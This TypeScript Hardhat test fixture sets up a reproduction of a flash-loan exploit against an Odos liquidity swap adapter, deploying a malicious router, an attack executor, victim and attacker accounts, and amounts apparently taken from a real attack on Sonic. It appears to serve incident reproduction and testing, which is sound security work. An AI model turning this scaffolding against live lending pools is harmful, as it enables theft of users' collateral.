import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { ethers } from "hardhat";
import {
  AttackExecutor,
  DusdHelperMock,
  MaliciousOdosRouterV2,
  MockAToken,
  MockPoolAddressesProvider,
  MockPriceOracleGetterV2,
  OdosLiquiditySwapAdapter,
  StatefulMockPool,
  TestMintableERC20,
} from "../../../../../../typechain-types";
import { ATTACK_COLLATERAL } from "../helpers/attackConstants";

export const COLLATERAL_DECIMALS = 6;
export const DUSD_DECIMALS = 18;

export const COLLATERAL_TO_SWAP = ethers.parseUnits("26243.751965", COLLATERAL_DECIMALS);
export const BURST_ONE = ethers.parseUnits("26230.630089", COLLATERAL_DECIMALS);
export const BURST_TWO = ethers.parseUnits("8877.536706", COLLATERAL_DECIMALS);
export const FLASH_LOAN_PREMIUM = (COLLATERAL_TO_SWAP * 5n) / 10_000n;
export const FLASH_SWAP_AMOUNT = COLLATERAL_TO_SWAP - FLASH_LOAN_PREMIUM;
export const EXTRA_COLLATERAL = BURST_ONE + BURST_TWO + FLASH_LOAN_PREMIUM;
export const SAME_ASSET_DUST = ATTACK_COLLATERAL.DUST_OUTPUT;

export const FLASH_MINT_AMOUNT = ethers.parseUnits("27000", DUSD_DECIMALS);
export const DUSD_STAGE_ONE = ethers.parseUnits("21444.122422884130710969", DUSD_DECIMALS);
export const DUSD_STAGE_TWO = ethers.parseUnits("7133.477578004629885067", DUSD_DECIMALS);
export const DUSD_RECYCLER_PULL_ONE = ethers.parseUnits("26681.458777948890901201", DUSD_DECIMALS);
export const DUSD_RECYCLER_PULL_TWO = ethers.parseUnits("8998.899406948321393581", DUSD_DECIMALS);
export const DUSD_RECYCLER_RETURN = ethers.parseUnits("7052.758184008451698746", DUSD_DECIMALS);

export const DUSD_SPLITTER_ROUND = ethers.parseUnits("25", DUSD_DECIMALS);
export const MICRO_DISTRIBUTOR_ONE = ethers.parseUnits("0.01", DUSD_DECIMALS);
export const MICRO_DISTRIBUTOR_TWO = ethers.parseUnits("0.24", DUSD_DECIMALS);

export interface OdosV1ExploitFixture {
  deployer: HardhatEthersSigner;
  victim: HardhatEthersSigner;
  attacker: HardhatEthersSigner;
  attackerBeneficiary: HardhatEthersSigner;
  reserveManager: HardhatEthersSigner;
  pool: StatefulMockPool;
  addressesProvider: MockPoolAddressesProvider;
  priceOracle: MockPriceOracleGetterV2;
  router: MaliciousOdosRouterV2;
  attackExecutor: AttackExecutor;
  adapter: OdosLiquiditySwapAdapter;
  wstkscUsd: TestMintableERC20;
  dusd: TestMintableERC20;
  aWstkscUsd: MockAToken;
  aDusd: MockAToken;
  stagingVault: DusdHelperMock;
  recyclerHelper: DusdHelperMock;
  splitterHelper: DusdHelperMock;
  microDistributorOne: string;
  microDistributorTwo: string;
}

export async function deployOdosV1ExploitFixture(): Promise<OdosV1ExploitFixture> {
  const [deployer, victim, attacker, attackerBeneficiary, reserveManager] = await ethers.getSigners();

  const PoolFactory = await ethers.getContractFactory("StatefulMockPool");
  const pool = await PoolFactory.deploy();

  const PriceOracleFactory = await ethers.getContractFactory("MockPriceOracleGetterV2");
  const priceOracle = await PriceOracleFactory.deploy();

  const AddressesProviderFactory = await ethers.getContractFactory("MockPoolAddressesProvider");
  const addressesProvider = await AddressesProviderFactory.deploy(await pool.getAddress(), await priceOracle.getAddress());

  const TokenFactory = await ethers.getContractFactory("TestMintableERC20");
  const wstkscUsd = await TokenFactory.deploy("Wrapped Staked scUSD", "wstkscUSD", COLLATERAL_DECIMALS);
  const dusd = await TokenFactory.deploy("Degen USD", "dUSD", DUSD_DECIMALS);

  const MockATokenFactory = await ethers.getContractFactory("MockAToken");
  const aWstkscUsd = await MockATokenFactory.deploy(
    "dLend Wrapped Staked scUSD",
    "aWSTKSCUSD",
    COLLATERAL_DECIMALS,
    await pool.getAddress(),
  );
  const aDusd = await MockATokenFactory.deploy("dLend dUSD", "aDUSD", DUSD_DECIMALS, await pool.getAddress());

  await pool.setReserveData(await wstkscUsd.getAddress(), await aWstkscUsd.getAddress(), ethers.ZeroAddress, ethers.ZeroAddress);
  await pool.setReserveData(await dusd.getAddress(), await aDusd.getAddress(), ethers.ZeroAddress, ethers.ZeroAddress);

  const RouterFactory = await ethers.getContractFactory("MaliciousOdosRouterV2");
  const router = await RouterFactory.deploy();

  const AdapterFactory = await ethers.getContractFactory("OdosLiquiditySwapAdapter");
  const adapter = await AdapterFactory.deploy(
    await addressesProvider.getAddress(),
    await pool.getAddress(),
    await router.getAddress(),
    deployer.address,
  );

  const AttackExecutorFactory = await ethers.getContractFactory("AttackExecutor");
  const attackExecutor = await AttackExecutorFactory.deploy(
    await wstkscUsd.getAddress(),
    await dusd.getAddress(),
    await router.getAddress(),
    await adapter.getAddress(),
    attackerBeneficiary.address,
  );

  const HelperFactory = await ethers.getContractFactory("DusdHelperMock");
  const stagingVault = await HelperFactory.deploy(await dusd.getAddress(), await attackExecutor.getAddress());
  const recyclerHelper = await HelperFactory.deploy(await dusd.getAddress(), await attackExecutor.getAddress());
  const splitterHelper = await HelperFactory.deploy(await dusd.getAddress(), await attackExecutor.getAddress());

  const microDistributorOne = ethers.Wallet.createRandom().address;
  const microDistributorTwo = ethers.Wallet.createRandom().address;

  await attackExecutor.transferOwnership(attacker.address);
  await attackExecutor.connect(attacker).setPool(await pool.getAddress());
  await attackExecutor.connect(attacker).configureDusdHelpers({
    stagingVault: await stagingVault.getAddress(),
    recycler: await recyclerHelper.getAddress(),
    splitter: await splitterHelper.getAddress(),
    microDistributorOne,
    microDistributorTwo,
  });

  await wstkscUsd.mint(victim.address, COLLATERAL_TO_SWAP);
  await wstkscUsd.mint(reserveManager.address, EXTRA_COLLATERAL);

  await wstkscUsd.connect(victim).approve(await pool.getAddress(), COLLATERAL_TO_SWAP);
  await wstkscUsd.connect(reserveManager).approve(await pool.getAddress(), EXTRA_COLLATERAL);

  await pool.connect(victim).supply(await wstkscUsd.getAddress(), COLLATERAL_TO_SWAP, victim.address, 0);
  await pool.connect(reserveManager).supply(await wstkscUsd.getAddress(), EXTRA_COLLATERAL, reserveManager.address, 0);

  await dusd.mint(await recyclerHelper.getAddress(), DUSD_RECYCLER_PULL_ONE + DUSD_RECYCLER_PULL_TWO);

  // Configure router with default behavior (will be overridden per test case)
  // NOTE: Production Sonic attack returns 1 µ wstkscUSD (same-asset dust), but current harness
  // uses dUSD output as a workaround to avoid the adapter's same-asset underflow check.
  // See Reproduce.md "Critical Deviation: Same-Asset Dust Return" for details.
  await router.setSwapBehaviourWithDust(
    await wstkscUsd.getAddress(),
    await wstkscUsd.getAddress(),
    COLLATERAL_TO_SWAP,
    SAME_ASSET_DUST,
    false,
    await attackExecutor.getAddress(),
  );

  return {
    deployer,
    victim,
    attacker,
    attackerBeneficiary,
    reserveManager,
    pool,
    addressesProvider,
    priceOracle,
    router,
    attackExecutor,
    adapter,
    wstkscUsd,
    dusd,
    aWstkscUsd,
    aDusd,
    stagingVault,
    recyclerHelper,
    splitterHelper,
    microDistributorOne,
    microDistributorTwo,
  };
}

export function createMaliciousSwapData(router: MaliciousOdosRouterV2): string {
  return router.interface.encodeFunctionData("performSwap");
}
